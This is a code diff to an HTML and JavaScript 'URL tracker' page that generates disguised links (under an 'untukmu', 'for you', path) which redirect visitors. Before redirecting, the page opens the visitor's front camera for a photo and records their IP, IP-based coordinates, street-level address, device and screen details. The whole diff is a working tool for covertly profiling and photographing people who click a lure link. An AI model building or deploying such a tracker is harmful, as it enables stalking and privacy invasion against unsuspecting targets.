@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced URL Tracker</title>
+    <title>Advanced URL Tracker with Camera</title>
     <style>
         :root {
             --primary: #3b82f6;
@@ -190,6 +190,41 @@
             margin-top: 15px;
         }
         
+        .camera-preview {
+            width: 100%;
+            max-width: 400px;
+            margin: 15px auto;
+            border: 2px solid var(--primary);
+            border-radius: 5px;
+        }
+        
+        .camera-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .capture-btn {
+            padding: 10px 20px;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        
+        .capture-btn:hover {
+            background-color: var(--primary-dark);
+        }
+        
+        .captured-image {
+            max-width: 100%;
+            max-height: 300px;
+            margin-top: 15px;
+            display: none;
+        }
+        
         @media (max-width: 768px) {
             .input-group, .url-display {
                 flex-direction: column;
@@ -252,6 +287,20 @@
         </div>
     </div>
 
+    <!-- Camera Modal -->
+    <div id="camera-modal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <h3>Camera Capture</h3>
+            <div class="camera-container">
+                <video id="camera-preview" class="camera-preview" autoplay playsinline></video>
+                <button id="capture-btn" class="capture-btn">Capture Photo</button>
+                <img id="captured-image" class="captured-image" alt="Captured photo">
+                <button id="confirm-capture" class="capture-btn" style="display: none;">Use This Photo</button>
+            </div>
+        </div>
+    </div>
+
     <script>
     // DOM Elements
     const targetUrlInput = document.getElementById('target-url');
@@ -262,6 +311,34 @@
     const refreshBtn = document.getElementById('refresh-btn');
     const clearBtn = document.getElementById('clear-btn');
     const resultsBody = document.getElementById('results-body');
+    const cameraModal = document.getElementById('camera-modal');
+    const cameraPreview = document.getElementById('camera-preview');
+    const captureBtn = document.getElementById('capture-btn');
+    const capturedImage = document.getElementById('captured-image');
+    const confirmCapture = document.getElementById('confirm-capture');
+    const closeModalButtons = document.querySelectorAll('.close-modal');
+
+    // Camera stream
+    let cameraStream = null;
+    let capturedPhotoData = null;
+
+    // Close modal function
+    function closeModal(modal) {
+        modal.style.display = 'none';
+        
+        // Stop camera stream if it's the camera modal
+        if (modal.id === 'camera-modal' && cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+            cameraStream = null;
+        }
+    }
+
+    // Close modals when clicking X
+    closeModalButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            closeModal(this.closest('.modal'));
+        });
+    });
 
     // Generate Tracking URL
     generateBtn.addEventListener('click', function() {
@@ -280,7 +357,7 @@
         }
         
         const trackingId = 'trk_' + Math.random().toString(36).substr(2, 9);
-        const trackingUrl = window.location.origin + '/?track=' + trackingId + '&target=' + encodeURIComponent(targetUrl);
+        const trackingUrl = window.location.origin + window.location.pathname + 'untukmu/?track=' + trackingId + '&target=' + encodeURIComponent(targetUrl);
         
         trackingUrlInput.value = trackingUrl;
         trackingResult.style.display = 'block';
@@ -318,6 +395,7 @@
                 <td>${item.device || 'Unknown'}</td>
                 <td>
                     ${item.latitude ? `<button class="view-map" data-lat="${item.latitude}" data-lon="${item.longitude}">View Map</button>` : ''}
+                    ${item.cameraCapture ? `<button class="view-photo" data-img="${item.cameraCapture.imageData}">View Photo</button>` : ''}
                 </td>
             </tr>
         `).join('');
@@ -326,6 +404,13 @@
         document.querySelectorAll('.view-map').forEach(button => {
             button.addEventListener('click', function() {
                 showMap(this.dataset.lat, this.dataset.lon);
+            });
+        });
+        
+        // Add event listeners to photo buttons
+        document.querySelectorAll('.view-photo').forEach(button => {
+            button.addEventListener('click', function() {
+                showPhoto(this.dataset.img);
             });
         });
     }
@@ -364,6 +449,68 @@
         document.body.appendChild(modal);
     }
 
+    // Show photo modal
+    function showPhoto(imageData) {
+        const modal = document.createElement('div');
+        modal.className = 'modal';
+        modal.innerHTML = `
+            <div class="modal-content">
+                <span class="close-modal">&times;</span>
+                <h3>Captured Photo</h3>
+                <img src="${imageData}" style="max-width: 100%; max-height: 80vh; display: block; margin: 0 auto;">
+            </div>
+        `;
+        
+        modal.querySelector('.close-modal').addEventListener('click', function() {
+            modal.remove();
+        });
+        
+        document.body.appendChild(modal);
+    }
+
+    // Initialize camera
+    async function initCamera() {
+        try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false 
+            });
+            cameraPreview.srcObject = cameraStream;
+        } catch (err) {
+            console.error('Camera error:', err);
+            alert('Could not access camera. Please ensure you have granted camera permissions.');
+            closeModal(cameraModal);
+        }
+    }
+
+    // Capture photo from camera
+    captureBtn.addEventListener('click', function() {
+        const canvas = document.createElement('canvas');
+        canvas.width = cameraPreview.videoWidth;
+        canvas.height = cameraPreview.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
+        
+        capturedPhotoData = canvas.toDataURL('image/jpeg', 0.8);
+        capturedImage.src = capturedPhotoData;
+        capturedImage.style.display = 'block';
+        confirmCapture.style.display = 'inline-block';
+        captureBtn.style.display = 'none';
+    });
+
+    // Confirm photo capture
+    confirmCapture.addEventListener('click', function() {
+        if (capturedPhotoData) {
+            // Store the photo data temporarily until we complete the tracking process
+            sessionStorage.setItem('pendingCameraCapture', capturedPhotoData);
+        }
+        closeModal(cameraModal);
+    });
+
     // Refresh Data
     refreshBtn.addEventListener('click', loadTrackingResults);
 
@@ -381,38 +528,84 @@
     const targetUrl = params.get('target');
     
     if (trackingId && targetUrl) {
-        // Process tracking
-        const trackingData = {
-            timestamp: new Date().toISOString(),
-            target: decodeURIComponent(targetUrl),
-            referrer: document.referrer || 'Direct',
-            userAgent: navigator.userAgent,
-            device: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
-        };
+        // Show camera modal first
+        cameraModal.style.display = 'flex';
+        initCamera();
+        
+        // Process tracking after camera capture or skip
+        const processTracking = () => {
+            // Process tracking
+            const trackingData = {
+                timestamp: new Date().toISOString(),
+                target: decodeURIComponent(targetUrl),
+                referrer: document.referrer || 'Direct',
+                userAgent: navigator.userAgent,
+                device: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                screen: {
+                    width: window.screen.width,
+                    height: window.screen.height,
+                    colorDepth: window.screen.colorDepth
+                }
+            };
 
-        // Get IP and location data
-        Promise.all([
-            fetch('https://ipapi.co/json/').then(res => res.json()),
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=<LAT>&lon=<LON>&zoom=18&addressdetails=1`)
-        ])
-        .then(([ipData, nominatimRes]) => {
-            // Store IP data
-            trackingData.ip = ipData.ip;
-            trackingData.latitude = ipData.latitude;
-            trackingData.longitude = ipData.longitude;
-            
-            // Get detailed address from Nominatim
-            return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`)
-                .then(res => res.json())
-                .then(nominatimData => {
-                    if (nominatimData.address) {
-                        trackingData.address = [
-                            nominatimData.address.road || '',
-                            nominatimData.address.city || nominatimData.address.town || '',
-                            nominatimData.address.country || ''
-                        ].filter(Boolean).join(', ');
+            // Check for camera capture
+            const cameraData = sessionStorage.getItem('pendingCameraCapture');
+            if (cameraData) {
+                trackingData.cameraCapture = {
+                    timestamp: new Date().toISOString(),
+                    imageData: cameraData,
+                    imageSize: {
+                        width: capturedImage.naturalWidth,
+                        height: capturedImage.naturalHeight
+                    },
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform
                     }
-                    
+                };
+                sessionStorage.removeItem('pendingCameraCapture');
+            }
+
+            // Get IP and location data
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(ipData => {
+                    trackingData.ip = ipData.ip;
+                    trackingData.latitude = ipData.latitude;
+                    trackingData.longitude = ipData.longitude;
+                    trackingData.ipDetails = {
+                        city: ipData.city,
+                        region: ipData.region,
+                        country: ipData.country_name,
+                        org: ipData.org
+                    };
+
+                    // Get detailed address from Nominatim
+                    if (ipData.latitude && ipData.longitude) {
+                        return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`)
+                            .then(res => res.json())
+                            .then(nominatimData => {
+                                if (nominatimData.address) {
+                                    trackingData.address = [
+                                        nominatimData.address.road || '',
+                                        nominatimData.address.city || nominatimData.address.town || nominatimData.address.village || '',
+                                        nominatimData.address.country || ''
+                                    ].filter(Boolean).join(', ');
+                                    
+                                    // Add full Nominatim response
+                                    trackingData.nominatimResults = {
+                                        display_name: nominatimData.display_name,
+                                        address: nominatimData.address,
+                                        boundingbox: nominatimData.boundingbox
+                                    };
+                                }
+                                
+                                return trackingData;
+                            });
+                    }
+                    return trackingData;
+                })
+                .then(trackingData => {
                     // Save to localStorage
                     const allData = JSON.parse(localStorage.getItem('trackingData') || '[]');
                     allData.unshift(trackingData);
@@ -420,11 +613,16 @@
                     
                     // Redirect to target URL
                     window.location.href = decodeURIComponent(targetUrl);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    window.location.href = decodeURIComponent(targetUrl);
                 });
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            window.location.href = decodeURIComponent(targetUrl);
+        };
+
+        // Set up modal close handler to process tracking
+        cameraModal.querySelector('.close-modal').addEventListener('click', function() {
+            processTracking();
         });
     }
 
